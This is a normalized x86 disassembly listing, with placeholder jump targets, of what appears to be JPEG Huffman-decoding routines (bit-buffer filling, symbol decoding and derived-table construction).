mov eax [ ebx + 0x18 ]
mov edx [ eax ]
mov [ esp + 0x10 ] edx
mov ecx [ eax + 0x4 ]
mov [ esp + 0x14 ] ecx
mov eax [ esp ]
mov ecx [ esp ]
mov edx [ eax + 0xc ]
mov eax [ ecx + 0x10 ]
xor ecx ecx
mov [ esp + 0x8 ] ecx
mov ecx esi
mov esi ecx
jmp r-xdata
mov eax [ esp ]
cmp [ eax + 0x28 ] 0x0
jne r-xdata
mov ecx [ esp + 0x8 ]
cmp ecx [ ebx + 0x164 ]
jl r-xdata
mov eax ebx
call sub_48e534
test eax eax
jne r-xdata
mov ecx [ esi ]
cmp eax 0x1
mov [ esp + 0xc ] ecx
jge r-xdata
mov ecx [ ebx + 0x18 ]
mov esi [ esp + 0x10 ]
mov [ ecx ] esi
mov ebx [ esp + 0x14 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ esp ]
mov [ ecx + 0xc ] edx
mov edx [ esp ]
mov [ edx + 0x10 ] eax
mov eax [ esp ]
dec [ eax + 0x28 ]
mov eax 0x1
xor eax eax
jmp r-xdata
dec eax
mov ecx eax
mov edi edx
sar edi cl
test edi 0x1
je r-xdata
push 0x1
lea ecx [ esp + 0x14 ]
xchg ecx eax
call sub_48f43c
test eax eax
jne r-xdata
add esp 0x24
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
add esi 0x4
mov ecx [ esp + 0xc ]
mov di [ esp + 0x4 ]
or [ ecx ] di
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
xor eax eax
jmp r-xdata
sub_48eb68
push ebx
push esi
push edi
push ebp
add esp 0xfffffeb8
mov edi edx
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x1bc ]
mov [ esp + 0x4 ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x194 ]
mov [ esp + 0x8 ] eax
mov edx [ esp ]
mov eax [ edx + 0x19c ]
mov edx 0x1
mov ecx eax
shl edx cl
mov ecx eax
or eax 0xffffffff
shl eax cl
mov [ esp + 0xc ] edx
mov [ esp + 0x10 ] eax
mov edx [ esp ]
cmp [ edx + 0x114 ] 0x0
je r-xdata
mov edx [ esp + 0x4 ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov eax [ esp + 0x4 ]
cmp [ eax + 0x28 ] 0x0
jne r-xdata
mov edx [ esp + 0x4 ]
mov eax 0x1
dec [ edx + 0x28 ]
jmp r-xdata
mov ecx [ esp ]
mov [ esp + 0x44 ] ecx
mov eax [ esp ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
mov [ esp + 0x34 ] edx
mov ecx [ eax + 0x4 ]
mov [ esp + 0x38 ] ecx
mov eax [ esp + 0x4 ]
mov esi [ eax + 0xc ]
mov eax [ esp + 0x4 ]
mov ebx [ eax + 0x10 ]
mov eax [ esp + 0x4 ]
mov edx [ eax + 0x14 ]
mov [ esp + 0x18 ] edx
mov ecx [ edi ]
mov [ esp + 0x1c ] ecx
xor ecx ecx
mov eax [ esp + 0x4 ]
mov edx [ eax + 0x3c ]
mov [ esp + 0x24 ] edx
mov [ esp + 0x28 ] ecx
mov eax [ esp ]
mov edx [ eax + 0x190 ]
mov [ esp + 0x14 ] edx
cmp [ esp + 0x18 ] 0x0
jne r-xdata
mov eax [ esp ]
call sub_48e534
test eax eax
jne r-xdata
add esp 0x148
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x18 ] 0x0
jbe r-xdata
mov ecx [ esp + 0x28 ]
lea eax [ esp + ecx * 4 + 0x48 ]
mov [ esp + 0x30 ] eax
mov edx [ esp + 0x14 ]
lea ecx [ edx * 4 + rw-data ]
mov [ esp + 0x2c ] ecx
mov eax [ esp + 0x14 ]
cmp eax [ esp + 0x8 ]
jg r-xdata
xor eax eax
jmp r-xdata
mov edx [ esp ]
mov eax [ edx + 0x18 ]
mov edx [ esp + 0x34 ]
mov [ eax ] edx
mov ecx [ esp + 0x38 ]
mov [ eax + 0x4 ] ecx
mov eax [ esp + 0x4 ]
mov [ eax + 0xc ] esi
mov edx [ esp + 0x4 ]
mov [ edx + 0x10 ] ebx
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x18 ]
mov [ ecx + 0x14 ] eax
mov edx [ esp + 0x14 ]
cmp edx [ esp + 0x8 ]
jg r-xdata
cmp ebx 0x8
jge r-xdata
dec [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
mov eax [ ecx * 4 + rw-data ]
add eax eax
add eax [ esp + 0x1c ]
mov [ esp + 0x20 ] eax
mov edx [ esp + 0x20 ]
cmp [ edx ] 0x0
je r-xdata
lea ecx [ ebx - 0x8 ]
mov eax esi
sar eax cl
and eax 0xff
mov edx [ esp + 0x24 ]
mov ebp [ edx + eax * 4 + 0x90 ]
test ebp ebp
je r-xdata
push 0x0
lea eax [ esp + 0x38 ]
mov ecx ebx
mov edx esi
call sub_48f43c
test eax eax
je r-xdata
inc [ esp + 0x14 ]
mov eax [ esp + 0x14 ]
cmp eax [ esp + 0x8 ]
jle r-xdata
cmp ebx 0x1
jge r-xdata
mov ebp 0x9
sub ebx ebp
mov edx [ esp + 0x24 ]
movzx edi [ edx + eax + 0x490 ]
jmp r-xdata
mov edx [ esp + 0x28 ]
cmp [ esp + 0x28 ] 0x0
lea eax [ esp + edx * 4 + 0x48 ]
jle r-xdata
mov esi [ esp + 0x3c ]
mov ebx [ esp + 0x40 ]
cmp ebx 0x8
jge r-xdata
dec ebx
mov ecx ebx
mov eax esi
sar eax cl
test al 0x1
je r-xdata
push 0x1
lea eax [ esp + 0x38 ]
mov ecx ebx
mov edx esi
call sub_48f43c
test eax eax
je r-xdata
mov esi [ esp + 0x3c ]
mov ebx [ esp + 0x40 ]
mov ebp edi
sar ebp 0x4
and edi 0xf
test edi edi
je r-xdata
xor eax eax
dec [ esp + 0x28 ]
add eax 0xfffffffc
mov edx [ eax ]
mov ecx [ esp + 0x1c ]
mov [ ecx + edx * 2 ] 0x0
cmp [ esp + 0x28 ] 0x0
jg r-xdata
mov ebp 0x1
jmp r-xdata
mov edx [ esp + 0x20 ]
mov ax [ edx ]
movsx edx ax
and edx [ esp + 0xc ]
jne r-xdata
mov esi [ esp + 0x3c ]
mov ebx [ esp + 0x40 ]
cmp ebp 0xf
je r-xdata
dec edi
je r-xdata
mov eax [ esp + 0x24 ]
push eax
push ebp
lea eax [ esp + 0x3c ]
mov ecx ebx
mov edx esi
call sub_48f588
mov edi eax
test eax eax
jl r-xdata
test ax ax
jl r-xdata
mov edx [ esp + 0x2c ]
mov eax [ edx ]
add eax eax
add eax [ esp + 0x1c ]
mov [ esp + 0x20 ] eax
mov edx [ esp + 0x20 ]
cmp [ edx ] 0x0
je r-xdata
mov ecx ebp
mov edi 0x1
shl edi cl
mov [ esp + 0x18 ] edi
test ebp ebp
je r-xdata
cmp ebx 0x1
jge r-xdata
mov eax [ esp ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x76
or edx 0xffffffff
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov edx [ esp + 0x20 ]
mov cx [ esp + 0x10 ]
add [ edx ] cx
mov ecx [ esp + 0x20 ]
mov ax [ esp + 0xc ]
add [ ecx ] ax
jmp r-xdata
dec ebp
js r-xdata
cmp ebx 0x1
jge r-xdata
cmp ebp ebx
jle r-xdata
dec ebx
mov ecx ebx
mov eax esi
sar eax cl
test al 0x1
je r-xdata
push 0x1
lea eax [ esp + 0x38 ]
mov ecx ebx
mov edx esi
call sub_48f43c
test eax eax
je r-xdata
test edi edi
je r-xdata
inc [ esp + 0x14 ]
add [ esp + 0x2c ] 0x4
mov eax [ esp + 0x14 ]
cmp eax [ esp + 0x8 ]
jle r-xdata
dec ebx
mov ecx ebx
mov eax esi
sar eax cl
test al 0x1
je r-xdata
push 0x1
lea eax [ esp + 0x38 ]
mov ecx ebx
mov edx esi
call sub_48f43c
test eax eax
je r-xdata
sub ebx ebp
mov eax esi
mov ecx ebx
dec edi
sar eax cl
and eax edi
mov ebp eax
add [ esp + 0x18 ] ebp
jmp r-xdata
push ebp
lea eax [ esp + 0x38 ]
mov ecx ebx
mov edx esi
call sub_48f43c
test eax eax
je r-xdata
mov edi [ esp + 0x10 ]
jmp r-xdata
mov edi [ esp + 0xc ]
jmp r-xdata
mov esi [ esp + 0x3c ]
mov ebx [ esp + 0x40 ]
inc [ esp + 0x14 ]
add [ esp + 0x2c ] 0x4
mov eax [ esp + 0x14 ]
cmp eax [ esp + 0x8 ]
jle r-xdata
mov edx [ esp + 0x2c ]
mov eax [ edx ]
mov edx [ esp + 0x1c ]
mov [ edx + eax * 2 ] di
mov ecx [ esp + 0x30 ]
mov [ ecx ] eax
inc [ esp + 0x28 ]
add [ esp + 0x30 ] 0x4
mov edx [ esp + 0x20 ]
mov ax [ edx ]
movsx edx ax
and edx [ esp + 0xc ]
jne r-xdata
mov esi [ esp + 0x3c ]
mov ebx [ esp + 0x40 ]
mov esi [ esp + 0x3c ]
mov ebx [ esp + 0x40 ]
test ax ax
jl r-xdata
mov edx [ esp + 0x20 ]
mov cx [ esp + 0x10 ]
add [ edx ] cx
jmp r-xdata
mov ecx [ esp + 0x20 ]
mov ax [ esp + 0xc ]
add [ ecx ] ax
jmp r-xdata
sub_48ef94
push ebx
mov ebx eax
mov eax ebx
push esi
mov ecx 0x40
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov edx eax
mov [ ebx + 0x1bc ] edx
mov [ edx ] sub_48e2e0
xor eax eax
lea ecx [ edx + 0x2c ]
mov edx ecx
xor ecx ecx
inc eax
mov [ edx ] ecx
add edx 0x4
cmp eax 0x4
jl r-xdata
mov eax ebx
mov ecx [ ebx + 0x24 ]
shl ecx 0x6
mov edx 0x1
mov esi [ eax + 0x4 ]
shl ecx 0x2
call [ esi ]
mov esi eax
mov [ ebx + 0xa0 ] esi
mov edx esi
xor ecx ecx
jmp r-xdata
cmp ecx [ ebx + 0x24 ]
jl r-xdata
xor eax eax
pop esi
pop ebx
retn
mov [ edx ] 0xffffffff
add edx 0x4
inc eax
cmp eax 0x40
jl r-xdata
inc ecx
sub_48f008
push ebx
mov ebx eax
push esi
push edi
add esp 0xfffffff0
mov esi [ ebx + 0x1bc ]
cmp [ ebx + 0x190 ] 0x0
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x7a
or edx 0xffffffff
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
cmp [ ebx + 0x194 ] 0x3f
jne r-xdata
mov ecx [ ebx + 0x148 ]
cmp ecx [ esp ]
jg r-xdata
cmp [ ebx + 0x198 ] 0x0
jne r-xdata
mov ecx [ esp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x14 ]
mov edi [ edx + 0x18 ]
mov ecx eax
lea edx [ esi + eax * 4 + 0x28 ]
push edx
mov edx 0x1
mov eax ebx
call sub_48f140
lea ecx [ esi + edi * 4 + 0x38 ]
xor edx edx
push ecx
mov ecx edi
mov eax ebx
call sub_48f140
mov eax [ esp + 0xc ]
xor edx edx
mov [ eax ] edx
inc [ esp ]
add [ esp + 0xc ] 0x4
add [ esp + 0x8 ] 0x4
xor eax eax
mov [ esp + 0x4 ] eax
lea eax [ esi + 0x48 ]
lea ecx [ ebx + 0x168 ]
jmp r-xdata
cmp [ ebx + 0x19c ] 0x0
je r-xdata
mov edx [ ebx + 0x164 ]
cmp edx [ esp + 0x4 ]
jg r-xdata
xor edx edx
mov [ esp ] edx
lea eax [ esi + 0x14 ]
mov [ esp + 0xc ] eax
lea edx [ ebx + 0x14c ]
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ ecx ]
mov [ esp ] edx
mov edx [ esp ]
mov edx [ ebx + edx * 4 + 0x14c ]
mov edi [ edx + 0x14 ]
mov edi [ esi + edi * 4 + 0x28 ]
mov [ eax ] edi
mov edi [ edx + 0x18 ]
mov edi [ esi + edi * 4 + 0x38 ]
mov [ eax + 0x28 ] edi
cmp [ edx + 0x30 ] 0x0
je r-xdata
xor eax eax
xor ecx ecx
mov [ esi + 0x10 ] eax
xor eax eax
mov [ esi + 0xc ] ecx
mov [ esi + 0x8 ] eax
mov edx [ ebx + 0x114 ]
mov [ esi + 0x24 ] edx
add esp 0x10
pop edi
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x78 ] edx
mov [ eax + 0x50 ] edx
mov [ eax + 0x50 ] 0x1
cmp [ edx + 0x24 ] 0x1
setg dl
and edx 0x1
mov [ eax + 0x78 ] edx
jmp r-xdata
inc [ esp + 0x4 ]
add eax 0x4
add ecx 0x4
sub_48f140
push ebp
mov ebp esp
add esp 0xfffffac8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi ecx
mov ebx [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ eax + 0x14 ] 0x32
mov [ eax + 0x18 ] esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
cmp esi 0x4
jl r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + esi * 4 + 0xc4 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + esi * 4 + 0xb4 ]
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x32
mov [ eax + 0x18 ] esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebx ]
mov esi 0x1
mov [ ebp - 0x10 ] eax
xor eax eax
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ edx + 0x8c ] ecx
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0xc ]
lea ebx [ eax + 0x1 ]
mov eax [ ebp - 0x4 ]
mov ecx 0x590
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov [ ebx ] eax
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
mov [ eax + 0x14 ] 0x8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x18 ]
cmp edx 0x100
jle r-xdata
mov ecx [ ebp - 0x18 ]
add [ ebp - 0x18 ] 0xffffffff
test ecx ecx
jne r-xdata
mov ecx [ ebp - 0x14 ]
lea eax [ ebp + ecx - 0x134 ]
jmp r-xdata
mov edx esi
mov [ eax ] dl
inc [ ebp - 0x14 ]
inc eax
inc esi
inc ebx
cmp esi 0x10
jle r-xdata
xor eax eax
mov al [ ebx ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x14 ]
xor ebx ebx
mov [ ebp + eax - 0x134 ] 0x0
mov edx [ ebp - 0x14 ]
xor eax eax
mov [ ebp - 0x1c ] edx
movsx esi [ ebp - 0x134 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ecx [ ebp - 0x14 ]
cmp [ ebp + ecx - 0x134 ] 0x0
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x14 ]
lea eax [ ebp + eax - 0x134 ]
lea edx [ ebp + edx * 4 - 0x538 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov esi 0x1
mov eax [ ebp - 0x10 ]
lea edx [ eax + 0x4c ]
mov [ ebp - 0x20 ] edx
mov ecx [ ebp - 0xc ]
lea eax [ ecx + 0x1 ]
movsx ecx [ eax ]
cmp esi ecx
je r-xdata
mov ecx [ ebp - 0x20 ]
mov [ ecx - 0x48 ] 0xffffffff
mov edx [ ebp - 0x14 ]
mov ecx [ ebp - 0x14 ]
sub ecx [ ebp + edx * 4 - 0x538 ]
mov edx [ ebp - 0x20 ]
mov [ edx ] ecx
xor ecx ecx
mov cl [ eax ]
add [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
mov ecx [ ebp + edx * 4 - 0x53c ]
mov edx [ ebp - 0x20 ]
mov [ edx - 0x48 ] ecx
jmp r-xdata
mov [ edx ] ebx
add edx 0x4
inc [ ebp - 0x14 ]
inc eax
inc ebx
mov ecx esi
mov eax 0x1
shl eax cl
cmp eax ebx
jg r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ eax + 0x44 ] 0xfffff
push 0x400
push 0x0
mov eax [ ebp - 0x10 ]
add eax 0x90
push eax
call sub_48ab3c
add esp 0xc
xor edx edx
mov [ ebp - 0x14 ] edx
mov esi 0x1
mov eax [ ebp - 0xc ]
lea edx [ eax + 0x1 ]
mov [ ebp - 0x20 ] edx
add [ ebp - 0x20 ] 0x4
inc esi
inc eax
cmp esi 0x10
jle r-xdata
add ebx ebx
inc esi
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x24 ]
xor edx edx
mov dl [ eax ]
cmp edx [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x28 ]
mov edx 0x8
sub edx esi
mov ebx [ ebp - 0x30 ]
mov eax [ eax ]
mov ecx edx
shl eax cl
mov ecx edx
mov edx 0x1
shl edx cl
mov ecx edx
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x2c ] ebx
test ecx ecx
mov ebx [ ebp - 0x10 ]
lea edx [ edx + eax + 0x490 ]
lea eax [ ebx + eax * 4 + 0x90 ]
jle r-xdata
inc esi
inc [ ebp - 0x20 ]
cmp esi 0x8
jle r-xdata
inc [ ebp - 0x18 ]
add [ ebp - 0x28 ] 0x4
inc [ ebp - 0x30 ]
inc [ ebp - 0x14 ]
mov [ eax ] esi
add eax 0x4
mov ebx [ ebp - 0x2c ]
dec ecx
mov bl [ ebx ]
mov [ edx ] bl
inc edx
test ecx ecx
jg r-xdata
mov [ ebp - 0x18 ] 0x1
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
lea edx [ ecx + eax + 0x11 ]
mov [ ebp - 0x30 ] edx
mov ecx [ ebp - 0x14 ]
lea eax [ ebp + ecx * 4 - 0x538 ]
mov [ ebp - 0x28 ] eax
mov edx [ ebp - 0x20 ]
mov ecx edx
mov [ ebp - 0x24 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0xc ]
lea edx [ eax + 0x11 ]
mov [ ebp - 0x20 ] edx
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x1c ]
jge r-xdata
mov eax [ ebp - 0x20 ]
movzx eax [ eax ]
test eax eax
jl r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ edx ]
mov [ ecx + 0x14 ] 0x8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
cmp eax 0xf
jle r-xdata
inc [ ebp - 0x18 ]
inc [ ebp - 0x20 ]
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x1c ]
jl r-xdata
sub_48f43c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov ecx [ ebp - 0x10 ]
cmp [ ecx + 0x1a0 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebp - 0xc ]
jle r-xdata
cmp [ ebp - 0xc ] 0x19
jge r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] esi
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ ecx + 0x8 ] eax
mov eax 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
mov [ edx + 0xc ] ecx
mov edx [ ebp - 0x10 ]
mov ecx [ edx + 0x1bc ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
test esi esi
jne r-xdata
mov ecx 0x19
sub ecx [ ebp - 0xc ]
shl [ ebp - 0x8 ] cl
mov [ ebp - 0xc ] 0x19
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x75
or edx 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x1bc ]
mov [ edx + 0x8 ] 0x1
dec esi
xor eax eax
mov al [ ebx ]
inc ebx
cmp eax 0xff
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x18 ]
call [ edx + 0xc ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
shl ecx 0x8
or eax ecx
mov [ ebp - 0x8 ] eax
add [ ebp - 0xc ] 0x8
cmp [ ebp - 0xc ] 0x19
jl r-xdata
test esi esi
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x18 ]
mov ebx [ eax ]
mov esi [ eax + 0x4 ]
xor eax eax
jmp r-xdata
jmp r-xdata
dec esi
xor eax eax
mov al [ ebx ]
inc ebx
cmp eax 0xff
je r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x18 ]
call [ edx + 0xc ]
test eax eax
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test eax eax
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x18 ]
mov ebx [ eax ]
mov esi [ eax + 0x4 ]
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov [ edx + 0x1a0 ] eax
jmp r-xdata
mov eax 0xff
jmp r-xdata
sub_48f588
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
cmp edi ebx
jle r-xdata
sub ebx edi
mov esi [ ebp - 0x8 ]
mov ecx ebx
mov eax 0x1
sar esi cl
mov ecx edi
mov edx [ ebp + 0xc ]
shl eax cl
dec eax
and esi eax
lea eax [ edx + edi * 4 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
push edi
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_48f43c
test eax eax
jne r-xdata
mov edx [ ebp - 0xc ]
cmp esi [ edx ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x8 ]
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0xc ]
or eax 0xffffffff
jmp r-xdata
add esi esi
cmp ebx 0x1
jge r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
cmp edi 0x10
mov [ eax + 0x8 ] edx
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] ebx
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec ebx
mov ecx ebx
mov eax [ ebp - 0x8 ]
sar eax cl
and eax 0x1
or esi eax
inc edi
add [ ebp - 0xc ] 0x4
push 0x1
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_48f43c
test eax eax
jne r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0xc ]
mov ecx [ edx + edi * 4 + 0x48 ]
mov edx [ eax + 0x8c ]
lea eax [ edx + esi ]
movzx eax [ eax + ecx + 0x11 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x76
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0x4 ]
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x8 ]
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0xc ]
or eax 0xffffffff
jmp r-xdata
sub_48f680
push ebx
mov ebx eax
push esi
mov esi [ ebx + 0x1bc ]
mov eax [ esi + 0x10 ]
test eax eax
jns r-xdata
sar eax 0x3
mov edx [ ebx + 0x1b8 ]
add [ edx + 0x18 ] eax
xor ecx ecx
mov [ esi + 0x10 ] ecx
mov eax ebx
mov edx [ eax + 0x1b8 ]
call [ edx + 0x8 ]
test eax eax
jne r-xdata
add eax 0x7
xor edx edx
lea eax [ esi + 0x14 ]
jmp r-xdata
xor eax eax
pop esi
pop ebx
retn
cmp edx [ ebx + 0x148 ]
jl r-xdata
xor ecx ecx
inc edx
mov [ eax ] ecx
add eax 0x4
mov edx [ ebx + 0x114 ]
mov [ esi + 0x24 ] edx
cmp [ ebx + 0x1a0 ] 0x0
jne r-xdata
mov eax 0x1
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x8 ] eax
sub_48f6f0
push ebx
push esi
push edi
push ebp
add esp 0xffffffb0
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x1bc ]
mov [ esp + 0x4 ] edx
mov ecx [ esp ]
cmp [ ecx + 0x114 ] 0x0
je r-xdata
mov edx [ esp + 0x4 ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov eax [ esp + 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ esp + 0x4 ]
dec [ eax + 0x24 ]
mov eax 0x1
mov ecx [ esp ]
mov [ esp + 0x3c ] ecx
mov eax [ esp ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
mov [ esp + 0x2c ] edx
mov ecx [ eax + 0x4 ]
mov [ esp + 0x30 ] ecx
mov ecx 0x4
mov eax [ esp + 0x4 ]
mov edi [ eax + 0xc ]
mov eax [ esp + 0x4 ]
mov ebx [ eax + 0x10 ]
mov eax [ esp + 0x4 ]
push esi
push edi
lea edi [ esp + 0x48 ]
lea esi [ eax + 0x14 ]
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x8 ] eax
mov edx [ esp ]
lea ecx [ edx + 0x168 ]
mov [ esp + 0x28 ] ecx
mov ecx esi
mov eax [ esp + 0x4 ]
lea edx [ eax + 0x48 ]
mov [ esp + 0x24 ] edx
mov [ esp + 0x20 ] ecx
jmp r-xdata
mov eax [ esp ]
call sub_48f680
test eax eax
jne r-xdata
mov eax [ esp ]
mov edx [ eax + 0x164 ]
cmp edx [ esp + 0x8 ]
jg r-xdata
xor eax eax
jmp r-xdata
mov eax [ esp + 0x20 ]
mov edx [ eax ]
mov [ esp + 0xc ] edx
mov ecx [ esp + 0x24 ]
mov eax [ ecx ]
mov [ esp + 0x10 ] eax
mov edx [ esp + 0x24 ]
mov ecx [ edx + 0x28 ]
mov [ esp + 0x14 ] ecx
cmp ebx 0x8
jge r-xdata
mov ecx [ esp ]
mov edx [ esp + 0x2c ]
lea esi [ esp + 0x40 ]
mov eax [ ecx + 0x18 ]
mov [ eax ] edx
mov ecx [ esp + 0x30 ]
mov [ eax + 0x4 ] ecx
mov eax [ esp + 0x4 ]
mov [ eax + 0xc ] edi
mov edx [ esp + 0x4 ]
mov [ edx + 0x10 ] ebx
mov ecx [ esp + 0x4 ]
lea edi [ ecx + 0x14 ]
mov ecx 0x4
[ edi ] [ esi ]
add esp 0x50
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx - 0x8 ]
mov eax edi
sar eax cl
and eax 0xff
mov edx [ esp + 0x10 ]
mov ebp [ edx + eax * 4 + 0x90 ]
test ebp ebp
je r-xdata
push 0x0
lea eax [ esp + 0x30 ]
mov ecx ebx
mov edx edi
call sub_48f43c
test eax eax
jne r-xdata
mov ebp 0x9
sub ebx ebp
mov edx [ esp + 0x10 ]
movzx esi [ edx + eax + 0x490 ]
jmp r-xdata
mov edi [ esp + 0x34 ]
mov ebx [ esp + 0x38 ]
cmp ebx 0x8
jge r-xdata
xor eax eax
jmp r-xdata
mov edi [ esp + 0x34 ]
mov ebx [ esp + 0x38 ]
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
mov ebp 0x1
jmp r-xdata
mov eax [ esp + 0x24 ]
cmp [ eax + 0x50 ] 0x0
je r-xdata
cmp esi ebx
jle r-xdata
mov eax [ esp + 0x10 ]
push eax
push ebp
lea eax [ esp + 0x34 ]
mov ecx ebx
mov edx edi
call sub_48f588
mov esi eax
test eax eax
jge r-xdata
mov ecx [ esp + 0x24 ]
cmp [ ecx + 0x78 ] 0x0
je r-xdata
mov ecx [ esp + 0x28 ]
mov eax [ ecx ]
add esi [ esp + eax * 4 + 0x40 ]
mov [ esp + eax * 4 + 0x40 ] esi
mov edx [ esp + 0xc ]
mov [ edx ] si
sub ebx esi
mov ecx ebx
mov eax edi
sar eax cl
mov ecx esi
mov edx 0x1
shl edx cl
dec edx
and eax edx
cmp eax [ esi * 4 + rw-data ]
jge r-xdata
push esi
lea eax [ esp + 0x30 ]
mov ecx ebx
mov edx edi
call sub_48f43c
test eax eax
jne r-xdata
mov ebp 0x1
mov ebp 0x1
mov edx eax
mov edx [ esi * 4 + rw-data ]
add edx eax
jmp r-xdata
mov edi [ esp + 0x34 ]
mov ebx [ esp + 0x38 ]
xor eax eax
jmp r-xdata
lea ecx [ ebx - 0x8 ]
mov eax edi
sar eax cl
and eax 0xff
